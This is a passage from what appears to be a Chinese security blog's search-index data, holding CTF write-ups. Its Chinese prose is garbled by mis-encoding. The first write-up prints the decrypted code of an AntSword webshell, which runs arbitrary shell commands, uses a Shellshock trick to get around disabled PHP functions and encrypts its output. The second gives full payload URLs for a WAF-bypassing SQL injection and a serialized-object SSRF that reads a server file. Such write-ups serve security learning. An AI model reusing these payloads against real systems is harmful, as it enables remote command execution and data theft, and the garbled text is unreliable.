hQN9GQXGkkzyNSFoxs5IfsRbbO7ZHphlFhL4yYsRYAgp8MkMJ64x7NfIGoVgDJnA1YgORiJOf8GP/p/28MLOuscy1SVN/lLnJzbhmf/7vfg0/Q94QAEWk2TOgSil0h3JDsgQYqDtFFldHWDnqEvYlWZI=|C2ZaL3MQWCQBmNcq8xAxxlhvXzUxo0qBz2PUIqBIMcKNJ3sgxU+RTqSwYoqPTDAg3//7rNa+dkinRAidD8GjrcSBd5qdbTLQlWZGME9Lv6JEFt0udTU0FVrhV/ctPz+z1NN5P4pN1tj35sNKsyfYH1kq13A+3dYk0wZlMU9KIFI=|l65yWzb3A97Cdu0wdn59Hiag/Um4/LZTrolCjwo9d7/J3Z9stTkaEtLe2XBdVQZsipUfnW2o7JWgQNo0TUbGWIv2H5wKGaTfPm7OTSkm+ao48Nn1d/+yME+RLudQqbmYREMAJFviNJST+H4Q+MqyngjMeGrb5jmlw0eQZ/MUx5Q=|EYwu5Y3rgl8k2KrPZjnGPWjriLI1mDeJwA4KhjvJ4wQs9Xx+ITDsxBr0eMfL/Km95ykbfMlZcrSzonx5hLiE2YLwDjX/cIIZxqzZXkEYq00AdAPrFnhFVdvJn/SHQ1LdGHgAN88Y2EOZOPM8ZXima61BxCY44TlrezIbBj4+eQ0=|Z2/dEUju0jw63PMHCK9CAG+tHmwiH0t3GraGPCes4TZT5hIfv6kHMTOgMthTK6sd5qy+EVw6d1Qxh03WMHVH0gR2aYqEl1RdYwQpN0NPsSM+fETsag3nQ4oV3VniGlaMmdFIiYatNvKNl7tOcapklyxEEIA0Jc33O7FDjUXKiHU=|YEVG5OctKJXP1Z7kywDJGrmb7BvXW/C3iQudtTCLgUIbMhXFq90wLvW7No7ZoqhY/Mh1XlJKtkBZJWEbsORW23hxvA5LCb/edsfJmIxWtj5cRG9g66j3BiEUPDjvtYi6beUjUtKmuSInELTkmIKf1jo5qyZE+VcWC4HfAT0wbFw=|ii/O42J/+ko4xPNfNuunKR7gyji/wtaiMcKMzQM2Qg7KZE/+xAcLX3Znh55OwgsfaTX6AedF+L/1hwMp9zigbvXorSE0TNay//nVlcnhhC4snAu2/hjXNoI3OnnWlfFFLYOj5v+1LN1nCU/UzoHV6/w1/4bVz7Maovj14BfXklI=|eay1qqOy5QmJmStB9EH4JKPms1In5agVigegn5/1IZS+0QpBgK37mWg02rspbMz20brtSgsv2PhJ3gMTFg3ib7z0cQZPvcNV6DTZwSHbUO2M1uQetssYMMnBPPulwLhTkND4SzwSsgDLS6m8TxbHL0qpZRcnNo2sMy478S5DkvM=|e4qLRtta2W6ItXy3HNgpYuQuSSzpsvq+SUfoRKWM8Z5QdiBeleS/YDGP0VZqRJh3CPMC6vbegwB7qNLAt6czTsHQTdTAJBLr5g4oTDc9Sxlk8A7vvK0ljLSgKjNw5s3BDa03jINPkc5BbDkrTaXMq01Bqcu5DPTTA0pO/Z9oq1Q=|RBdZrEGknOK+PCuQ1F2eTxKvAi50XD/Z1ccAItPJ+48VlSbOTZa/wkdr82K8LE56z0E4JtZDBVSj9I4TurU2bbmfCjKXGw9xlagS7YMr/hfyCy/2hrVveAkaBZDAtmnrM4nGpFxVpzArl124XlqEzh9cSS9LAnwkNm8j05D6mDc=|aZpV5K4m1Rwxd/Y9eOfJ0bRpIZybj2tSjuAEJI7Il/EV9ZC0pXLIkgWviG40pXQFGoEwGex7f0j/Je4ldLRKnrpsyZ+/3mZtHnHL4gepf+iVaULQ8jdHTVVnM1t4qLJk+RnhYbuFjcUy5Yo6rn0Cju8sPIdpEwvi8fvetIOGVJE=|fPGROe6VaAwzqmNuk86fnWT4LqandXTwuewTC80zI8xTFSj1S6YMxPROTHS94gXlCcLTfFjEW2VpH2tyANX1FBIw5sSjsuS6CQKuqiQo6ID975H5Ox+KkJs6XLP/l5Or34U3rryHzBooTrXQlDl21qoPBLdj5URgGrEq7wrvLVA=|jp3lUm3Gz2eZpB5zghEGom2syK8nBymkc6h3pKE/mIS8KW6gD2OFSEneFERI0jy26kVOBhxr3ZHY3WoL6s5aJepTuY7D6Dpz/REI+FzR2PlCo0WvyLQdOphMgbYef1SyYr1+DWK/JxxFjxtfVRZlwL7+OyHQjQ05oVHyq6juSEI=|h8tsCCKgjChZ5U/sZxeVPiF8hO+cB6qqfeWnTAMydEcLmR0iwvHcarZw4g2WH2ASvwIN0av4GzLSu2QtOM1u0y/OuVX3v9/Vp+nNMZ/Dog0NUxFIPD1HTgaK3w7DdnA6B6i26JooWAxKlTFgYmr0x7K53pmM6B8wVQu/ADsbFBE=|CdejrTSVZhSgL+3bhPQyuL7ho71i+L8VvpwNg+D84YnKdwbbbfgqIMu+gefCBmyzvhbhEeGR16/T/fZ4bkneak+fzZpgUrejrFbOETG2Rg9zViznPwBdku9FTlWUybaRD0CHKeY7nE93/G2yXWSpuk/7P594cAPi1qd2WnEbaBc=|Hnxjy7ZSfmn6B59Kv7VXu1mhtYdgGbOtsLsLqDX6K1dKhtHsGx0guy03qwqRA0XElDdJ3Dvgqi5lgb8SY6MiDf1c9u870K8S9xVTn6Y0lbZgtvPoDrobEiT6tGEQCRsUuXB6jbUTgnNPmaDAuidQZqdsSBIGZwQyzycgxHmaDuE=|Imz1om4RRCU1Wnyowe5SYFtICyD1BODveyZ497yURKcyMgoogUxi0cPCiyexdD9ciNYk6DGyimegT7zMeIA5oGfNg2EHbzuBJeSc4wqLCJtSmTe66inu3dqC4IDxt2ghkgFLSQZWqNOKOgUt1b5wgy3O/Y3iIzS888TuFSDm+RQ=|jldlrb8EHvWiKi5E/HBIrn4UUnzMZO8+6ugZ7hjZTtWI5Vg9EeWdmITpEpOQIWIXpOUhaI+VydVcom8e7Fe6gR6u4RPy5ChmFgjZhT03gwwNXzJeiaE6x7ZZjXGBZA3Lwu5gRns3s+hTM0Tm2vrhGOQDB41hDDi4N/Yb3MRn0PM=|UJKgd4FCzzzMeQEq+w3S17+3d+g9mM3JM2qZWkWHOIF3L/EiWpRhm18DuaWJ7veqQSA5pb3KGH9rKDvj2KHIDTUHl0gCiH1U5qeD+WqXFvLahN5O8ecrfgflUUip1SdE6aL6dYqzyplxF+qy3BVr2dKq+6UYlUiA5Bmn2lXSIyM=|LClEAJBfCO7HMhlu0ASDbetkR7sP4aOx9a/P4P0L5kLeGYrlrK4Qg3ZNl7Fd/gQ8KXAKs90XRE62pfZidMX1A4xj/IokC6nkXCNUIzi0PWPWdCzcBNiswbQtsTZhElecl8RyfaOSvxsiKclTvKbZYfQI5r0p0asBs5gKnK0FpT4=|paMu+DWwNp+5GRSiGn4QfFaS/ffXXKuBgP/qzsixnnBWMeXIVy/HT23Xdoc7/OdlIH8/rBKdrJt+7o6XUAbRGzND9sEuf0Ldh5npWln/EhSkGq+bqt1hDfmwwsoo2GJcNDHBhz6lQq2M4zoa9E9d04T3N/SE+3B7LFb0cxLE8aA=|Cz+hQca9uYZJPPJusvE1G8X12VF5iPFM83nOnszF38XQziVKd+D83N4IvoJPNdJLEtgbycIpg1bo5auK1u9n2Pv8z1jFHoaTzmPgDBFiAAv3NGd0m2vg09QwRxq84PD9Ey0dwT7C1w2e6M9wGJ6DoIhPhZQgvUKMyrmCAVmMo18=|h59BqEgdFq4a1HegvdVKeMWwiwQMQsaSzYOxbNCiPuCRGknF8dHHkQboB65gnjbNBDPVpiVoDBMDV+1sCc1yM8zqC494bDS7iopf/U3BBnZS2wCxeo1x78DUiEgzP6ILomxrhrMY2y5R9IbmhJQVkpiqMhPaCvvHzOZO6Pz9SHg=|gUSFO4uVnPAI4UVTKCdBqH/rD6BZZFPfhsVOzga0ohjOJhXW+pvAu4GSh+3FIGn6cpxBUILbsLjBSgmscqAbKV/nHRnQ8HjQUgnu5YM8KikKJV35OMt1Mo1P/qlF5bwzI969XDtUHtClPkznXuO4HyvGLj0/mJj0IauhxfDKhyU=|jkhijGHqR86l+YGh7fldHrzLfam9LUYfRt2nrqqgeqCoE6KO8khatGkzLPk8QgIjLti6P6d7AwwPdVLX3gsfv6bBhT26qUR1u5+AA8foNt5tH6Ej33OODcnkxcp19eFu+zWRG1zUDkBs5qtCJvZKnpSPFKxJ6Z2g0RAoKF3pqbY=|QayQ2dVrEz8KBgpVQjGRNbpRHgFhVK3e89fEzEKzlclezrZ7CBgjB6/Y0PPYSIeZldFEZficAzHXs+bFHALEMrkJlRMk36FMuqtn0YVs4cVy8AHxjb8QnJD9gsFC6q2EWmRo8w4ZdBvg1xyeg3D0vhOcZgNk78BGoSU2HhHK5xY=|Ncgk0CAlnik6xDFINohB1EqgT7tS8COpia8O9cuvi53lNlQWY4IWG2oZMgzNWeU/m8QL+EGqhrD6IflJDD/hDO/IFC6D2DEjeMofqJ/6sHXAt2lIV129SeUUjGdrxyxeWDtqu6iBDdDBtyfPVfeI/DMYOh46XkR0Wk5nBU2N7+U=|lOxi5A2Z8sa8+aw5rQm0g6gqukXMlwvLV7ykEiGWFRqFqDaRPnkVI8diKsvgBg0Btk94gXt2FX1polSNgIJL3E6GW9loo2OMSGBBg1KJ/6VC/DpLWy44VbZhrUB//hiXo3xua6h2DRDi4h5eFkkf2ZIjGjZBi+AqHQINUbetN54=|DRBn6EF3Eoj+wpOX2xhKhkrypPB+d2+8PyHzXwKL8QmOeaRufeCZ1/7Id4TQPXiRXOYsPDXVLr1tUWAUNfqIQisGxSL8lAgg9LzYNYxRUejuTsP2WmVSO21cYXTPlNYjJDR+BkTtOlAvBBp3fjwhOVlr1khuzAhl2Y799drdSFk=|VIJ6dfEfxNcc1eWhAL0dMWXkGSCnBqv+I+Hqs7mGdK9CG3sMH1LyhIEsYg/UPccftYAPeIqKitOpj4OlNbGQMlf8AIJgFvNceAl7HCwqf/6ggZzfcBx5r4HpCBI3cB2zOOOlX9AFVRcunk3rCZSsaeQ8QGsLC1q/2EImzQqSB5g=&quot;;$pk = &lt;&lt;&lt;EOF-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNhTQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3jOdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7ALzrcBi88Eu7oZaPANwIDAQAB-----END PUBLIC KEY-----EOF;$cmds = explode(&quot;|&quot;, $ant);$pk = openssl_pkey_get_public($pk);$cmd = &#x27;&#x27;;foreach ($cmds as $value) &#123; if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123; $cmd .= $de; &#125;&#125;print_r($cmd);?&gt; è¿˜åŸåçš„æ•°æ®æ˜¯: 1@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;@session_start();$key=@substr(str_pad(session_id(),16,&#x27;a&#x27;),0,16);return @base64_encode(openssl_encrypt(base64_encode($out), &#x27;AES-128-ECB&#x27;, $key, OPENSSL_RAW_DATA));&#125;;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;f3c7239848e0&quot;;echo @asenc($output);echo &quot;05fda2646c&quot;;&#125;ob_start();try&#123;$p=base64_decode($_POST[&quot;t185a78b977a47&quot;]);$s=base64_decode($_POST[&quot;wd0b7c7ca226cb&quot;]);$envstr=@base64_decode($_POST[&quot;b8dcb72ce2ba93&quot;]);$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;/c \\&quot;&#123;$s&#125;\\&quot;&quot;;if(substr($d,0,1)==&quot;/&quot;)&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);&#125;else&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);&#125;if(!empty($envstr))&#123;$envarr=explode(&quot;|||asline|||&quot;, $envstr);foreach($envarr as $v) &#123;if (!empty($v)) &#123;@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));&#125;&#125;&#125;$r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;function fe($f)&#123;$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));if(empty($d))&#123;$d=array();&#125;else&#123;$d=array_map(&#x27;trim&#x27;,array_map(&#x27;strtolower&#x27;,$d));&#125;return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));&#125;;function runshellshock($d, $c) &#123;if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe(&#x27;putenv&#x27;) &amp;&amp; (fe(&#x27;error_log&#x27;) || fe(&#x27;mail&#x27;))) &#123;if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;$tmp = tempnam(sys_get_temp_dir(), &#x27;as&#x27;);putenv(&quot;PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);if (fe(&#x27;error_log&#x27;)) &#123;error_log(&quot;a&quot;, 1);&#125; else &#123;mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);&#125;&#125; else &#123;return False;&#125;$output = @file_get_contents($tmp);@unlink($tmp);if ($output != &quot;&quot;) &#123;print($output);return True;&#125;&#125;return False;&#125;;function runcmd($c)&#123;$ret=0;$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if(fe(&#x27;system&#x27;))&#123;@system($c,$ret);&#125;elseif(fe(&#x27;passthru&#x27;))&#123;@passthru($c,$ret);&#125;elseif(fe(&#x27;shell_exec&#x27;))&#123;print(@shell_exec($c));&#125;elseif(fe(&#x27;exec&#x27;))&#123;@exec($c,$o,$ret);print(join(&quot; &quot;,$o));&#125;elseif(fe(&#x27;popen&#x27;))&#123;$fp=@popen($c,&#x27;r&#x27;);while(!@feof($fp))&#123;print(@fgets($fp,2048));&#125;@pclose($fp);&#125;elseif(fe(&#x27;proc_open&#x27;))&#123;$p = @proc_open($c, array(1 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;), 2 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;)), $io);while(!@feof($io[1]))&#123;print(@fgets($io[1],2048));&#125;while(!@feof($io[2]))&#123;print(@fgets($io[2],2048));&#125;@fclose($io[1]);@fclose($io[2]);@proc_close($p);&#125;elseif(fe(&#x27;antsystem&#x27;))&#123;@antsystem($c);&#125;elseif(runshellshock($d, $c)) &#123;return $ret;&#125;elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;))&#123;$w=new COM(&#x27;WScript.shell&#x27;);$e=$w-&gt;exec($c);$so=$e-&gt;StdOut();$ret.=$so-&gt;ReadAll();$se=$e-&gt;StdErr();$ret.=$se-&gt;ReadAll();print($ret);&#125;else&#123;$ret = 127;&#125;return $ret;&#125;;$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);print ($ret!=0)?&quot;ret=&#123;$ret&#125;&quot;:&quot;&quot;;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die(); ä»£ç å®¡è®¡åœ¨è¿™ä¸€ä¸²ä»£ç ä¸­å¯ä»¥å‘ç°æœ‰å‡ ä¸ªå…³é”®å‡½æ•°ï¼šasenc(),asoutput(),å‘ç°è¾“å‡ºçš„å†…å®¹æ˜¯f3c7239848e0+asenc($output)+05fda2646cï¼Œasencé‡Œé¢æ˜¯ç”¨AES-128-ECBåŠ å¯†ï¼Œkeyæ˜¯sessionå‰16ä½ï¼Œå»åŒ…é‡Œæ‰¾å°±è¡Œã€‚ æ•°æ®è¿˜åŸæ¥ä¸‹æ¥éœ€è¦åšçš„å°±æ˜¯è¿˜åŸæ•°æ®ï¼Œé€šè¿‡ä»£ç å®¡è®¡å¯ä»¥çŸ¥é“base64(AESåŠ å¯†ï¼ˆbase64(out)ï¼‰)åçš„å†…å®¹æ˜¯+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4=æŠŠè¿™ä¸ªè§£å¯†å°±è¡Œäº†ã€‚è§£å¯†æ–¹æ³•ï¼š 12$res=base64_decode(&quot;+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4=&quot;);$res=openssl_decrypt($payload, &#x27;AES-128-ECB&#x27;, $k,OPENSSL_RAW_DATA) ç„¶åå†åšä¸¤æ¬¡base64è§£å¯†å°±å¯ä»¥å¾—åˆ°flagäº†ã€‚(cat flagé‡Œé¢çš„æ–‡ä»¶ä¹Ÿæ˜¯base64åŠ å¯†çš„) é¢˜ç›®æ€»ç»“è¿™é“é¢˜æœ‰ç‚¹éº»çƒ¦ï¼Œä¸»è¦æ˜¯ä¸äº†è§£èšå‰‘çš„æµé‡ç‰¹å¾ã€‚åœ¨awdä¸­shellçš„å…æ€ä¸wafæ°¸è¿œæ˜¯åœ¨ä¸æ–­è¿­ä»£å‡çº§çš„ã€‚è¿˜éœ€è¦å­¦ä¹ çš„å§¿åŠ¿æœ‰å¾ˆå¤šï¼Œåº”è¯¥å¤šåˆ†ææµé‡ï¼Œæ€»ç»“ç‰¹ç‚¹ã€‚ è“ç‰™æ•°æ®åŒ…è“ç‰™è¿™é“é¢˜æˆ‘ä¸€å¼€å§‹çœ‹åˆ°æ²¡ä»€ä¹ˆæ€è·¯ï¼Œå› ä¸ºæ²¡æœ‰å­¦è¿‡è“ç‰™ç›¸å…³çš„åè®®ã€‚äºæ˜¯ä»ç½‘ä¸Šç°å­¦äº†ç‚¹ï¼Œå‘ç°ä¼ è¾“æ•°æ®ä½¿ç”¨çš„åè®®ï¼Œæœäº†æœåè®®åè¿˜çœŸæœå‡ºæ¥ä¸ª.7zæ–‡ä»¶ã€‚æœå‡ºæ¥ä¹‹åæŠŠè¿™ç©æ„åå…­è¿›åˆ¶å¯¼å…¥åˆ°010editorè¿˜åŸæˆ.7zï¼Œæç¤ºéœ€è¦è¾“å…¥å¯†ç ï¼Œé¦–å…ˆè€ƒè™‘ä¼ªåŠ å¯†ï¼Œå‘ç°ä¸æ˜¯ï¼ˆå…¶å®360ä¼šè‡ªåŠ¨ä¿®å¤ä¼ªåŠ å¯†ï¼‰ç„¶åçœ‹æ–‡ä»¶åæç¤ºäº†å¯†ç æ˜¯è“ç‰™çš„PINï¼Œäºæ˜¯åœ¨åŒ…ä¸­æœç´¢â€œPINâ€ã€‚ç¬¬ä¸€æ¬¡æœç´¢å…¶å®æˆ‘æœåˆ°äº†ã€‚ã€‚ä½†æ˜¯æ²¡æ‰¾åˆ°PIN,åˆšæƒ³çˆ†ç ´ï¼ˆPINçº¯æ•°å­—ï¼Œä½æ•°å°‘ï¼Œå¥½çˆ†ç ´ï¼‰çš„æ—¶å€™æœ‹å‹è¯´ä½ æœâ€PINâ€å°±è¡Œã€‚ã€‚ã€‚æˆ‘ã€‚ã€‚åäº†ã€‚æœåˆ°PINä¹‹åè§£å‹æ–‡ä»¶å¾—åˆ°flagã€‚","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"20200421å­¦ä¹ ç¬”è®°","slug":"20200421å­¦ä¹ ç¬”è®°","date":"2020-04-21T14:32:41.000Z","updated":"2020-04-21T16:14:27.758Z","comments":true,"path":"2020/04/21/20200421å­¦ä¹ ç¬”è®°/","link":"","permalink":"https://polosec.github.io/2020/04/21/20200421%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"ä»Šå¤©åšbuuojåšäº†ä¸€é“webé¢˜ï¼Œæ€»çš„æ¥è¯´è€ƒå¯Ÿåˆ°äº†SQLæ³¨å…¥ã€SSRFã€ååºåˆ—åŒ–çš„çŸ¥è¯†ç‚¹ã€‚è¿™ä¸‰ä¸ªè€ƒç‚¹æˆ‘éƒ½æƒ³åˆ°äº†ï¼Œä½†æ˜¯ä¸€å—è€ƒæˆ‘æ˜¯æ²¡æƒ³åˆ°çš„ã€‚å‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/weixin_43818995/article/details/104529233https://blog.csdn.net/weixin_45425482/article/details/103868660https://www.cnblogs.com/appleat/archive/2012/09/03/2669033.htmlhttps://www.w3school.com.cn/sql/sql_union.asp çŸ¥è¯†é“ºå«MYSQL UNION SELECT ï¼šæ¯”å¦‚select username,password from user union select 1,2UNION ç»“æœé›†ä¸­çš„åˆ—åæ€»æ˜¯ç­‰äº UNION ä¸­ç¬¬ä¸€ä¸ª SELECT è¯­å¥ä¸­çš„åˆ—åã€‚å¯ä»¥å…ˆæ ¹æ®orderbyåˆ¤æ–­å­—æ®µä¸ªæ•°ï¼Œåˆ¤æ–­å®Œå­—æ®µä¸ªæ•°åæ ¹æ®union select 1ï¼Œ2ï¼Œ3â€¦åˆ¤æ–­åœ¨å“ªå„¿æ˜¾ç¤ºã€‚å¯¹union UNION ç»“æœé›†ä¸­çš„åˆ—åæ€»æ˜¯ç­‰äº UNION ä¸­ç¬¬ä¸€ä¸ª SELECT è¯­å¥ä¸­çš„åˆ—å è¿™å¥è¯çš„ä¸¾ä¾‹ï¼š MYSQL CONCAT GROUP_CONCATconcat(str1,â€™separatorâ€™,str2) // separatoræ˜¯åˆ†éš”ç¬¦å¯ä»¥åœ¨ç»“æœä¸­è¿æ¥å¤šä¸ªå­—æ®µ æ¯”å¦‚ä¸‹å›¾ä¸¾ä¾‹ è¿æ¥username,passwordä¸ºä¸€ä¸ªå­—æ®µã€‚ group_concat()GROUP_CONCATå‡½æ•°è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœï¼Œè¯¥ç»“æœç”±åˆ†ç»„ä¸­çš„å€¼è¿æ¥ç»„åˆè€Œæˆã€‚ç®€å•çš„æ¥è¯´å°±æ˜¯æŠŠæŸ¥è¯¢åˆ°çš„æ•°æ®ä¸¢åˆ°ä¸€è¡Œæ˜¾ç¤ºï¼Œåœ¨æ³¨å…¥çš„æ—¶å€™å°±ä¸ç”¨ä¸€ä¸ªä¸ªlimitäº†ã€‚æ¯”å¦‚æŸ¥è¡¨åï¼šselect group_concat(table_name) from information_schema.tables where table_Schema=æ•°æ®åº“å ä¸€æ¡å¯ä»¥æŸ¥åˆ°è¯¥æ•°æ®åº“æ‰€æœ‰çš„è¡¨å SSRFphpçš„curlæœªç»ä¸¥æ ¼è¿‡æ»¤å¯èƒ½å¯¼è‡´SSRFï¼ˆåˆ©ç”¨fileåè®®ã€‚ï¼‰ é¢˜ç›®åˆ†æè¿›å»ä¹‹åæ³¨å†Œï¼Œæ³¨å†Œå®Œä¸çŸ¥é“æœ‰å•¥ç”¨äº†ï¼Œæ‰“å¼€æ‰«æå™¨æ‰«ä¸€ä¸‹ï¼Œæ‰«åˆ°äº†robots.txtrobots.txtæç¤ºäº†æœ‰ä¸ªuser.phpçš„å¤‡ä»½ï¼Œä¸‹è½½ä¸‹æ¥ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; å¯¹è¯¥æ–‡ä»¶åˆ†æå¯ä»¥å‘ç°å­˜åœ¨SSRFåˆ©ç”¨ç‚¹ï¼Œå…¶ä»–çš„æš‚æ—¶æ²¡æƒ³èµ·æ¥ã€‚ç„¶åçœ‹ä¸€ä¸‹/view.phpæ³¨æ„urlï¼Œç©¿äº†ä¸ªå‚æ•°ã€‚ã€‚maybeæ³¨å…¥ï¼Ÿç»™ä¸ª-1è¯•è¯•ï¼šæŠ¥é”™ã€‚æŠŠç»å¯¹è·¯å¾„çˆ†å‡ºæ¥äº†ï¼š/var/www/html/view.phpå†æŸ¥æŸ¥è¯•è¯•ï¼š-1 union select 1,2,3 ç»™wafäº† è¿‡æ»¤äº†å•¥ä¸çŸ¥é“ æŒ¨ä¸ªè¯•è¯•ï¼Œåº”è¯¥æ˜¯è¿‡æ»¤äº† union select,æŠŠç©ºæ ¼æ¢æˆæ³¨é‡Šç»•è¿‡ã€‚union//selectæˆåŠŸç»•è¿‡ã€‚æ¥ä¸‹æ¥å°±æ˜¯åˆ¤æ–­åˆ—æ•°ï¼ŒæŸ¥æ•°æ®åº“åï¼ŒæŸ¥è¡¨åï¼ŒæŸ¥å­—æ®µã€‚ã€‚http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union//select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27users%27 è¿™æ˜¯æŸ¥å­—æ®µç„¶åæŸ¥dataå­—æ®µ http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1%20union/**/select%201,group_concat(data),3,4%20from%20userså‘ç°æ•°æ®æ˜¯O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:6:â€123123â€;s:3:â€ageâ€;i:123123;s:4:â€blogâ€;s:13:â€www.baidu.com&quot;;}çœ¼ç†Ÿä¸ï¼Ÿåºåˆ—åŒ–åçš„æ•°æ®ï¼Ÿæ˜¯ä¸æ˜¯è¯¥æƒ³æƒ³ååºåˆ—åŒ–çš„é—®é¢˜äº†ï¼Ÿç„¶åè¯»å¤‡ä»½çš„ä»£ç ï¼Œæˆ‘ä»¬åº”è¯¥åˆ©ç”¨getBlogContentsï¼ˆï¼‰æ–¹æ³•è¿›è¡ŒSSRF,å†…å®¹ä¸ºfile://var/www/html/flag.phpï¼Œé‚£ä¹ˆæ³¨å†Œçš„æ—¶å€™èƒ½å¡«è¿™ä¸ªä¸ï¼Ÿå½“ç„¶è¿‡æ»¤äº†ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬çŒœæµ‹ï¼Œå®Œæ•´çš„æµç¨‹åº”è¯¥æ˜¯è¿™æ ·ï¼šç”¨æˆ·æ³¨å†Œhttpå¼€å¤´çš„blogï¼ŒæŠŠå¯¹è±¡åºåˆ—åŒ–åå­˜å…¥æ•°æ®åº“ï¼Œå½“ç”¨æˆ·æŸ¥è¯¢çš„æ—¶å€™ï¼ŒæŸ¥è¯¢åˆ°åºåˆ—åŒ–æ•°æ®ååºåˆ—åŒ–ï¼Œç„¶åäº¤ç»™getBlogContentsï¼ˆï¼‰æ–¹æ³•å»ç”¨curlå‘é€è¯·æ±‚ã€‚æˆ‘ä»¬è¦åšçš„å°±æ˜¯è®©æ•°æ®åº“æŸ¥åˆ°çš„è¯·æ±‚è¿”å›çš„æ˜¯æˆ‘ä»¬æ¶æ„æ„é€ çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„blogä¸ºfile:///var/www/html/flag.phpã€‚å°±æ˜¯è¦æŠŠ O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:3:â€123â€;s:3:â€ageâ€;i:0;s:4:â€blogâ€;s:29:â€file:///var/www/html/flag.phpâ€;} è¿™ä¸€ä¸²å½“ä½œæŸ¥è¯¢è¿”å›çš„ç»“æœï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼ŸUNION SELECTï¼æ³¨æ„ä¸åˆ—å¯¹åº”ï¼ˆæ ¹æ®æˆ‘ä»¬åˆšæ‰æŸ¥çš„åˆ—ï¼ŒçŸ¥é“dataæ˜¯ç¬¬å››ä¸ªå­—æ®µï¼Œæ‰€ä»¥æŠŠpayloadæ”¾åˆ°ç¬¬å››ä¸ªå­—æ®µä¸Šå¯¹åº”~ï¼‰payload:http://7f8c0885-83d5-462e-b56a-175f6b06308b.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:4:%22test%22;s:3:%22age%22;i:123;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27ç„¶åæŸ¥çœ‹æºç ä¸­çš„iframeï¼Œè§£å¯†base64å¾—åˆ°flagã€‚ åœ¨ä¸Šå¸è§†è§’å†çœ‹è¿™é“é¢˜ä¸ºäº†è¯æ˜æˆ‘çš„æ€è·¯æ˜¯æ­£ç¡®çš„ï¼Œæˆ‘åˆ©ç”¨SSRFæ¼æ´è·å–åˆ°äº†db.php,user.php,show,php,join.ok.phpä¸‹é¢æ˜¯view.phpçš„ä»£ç  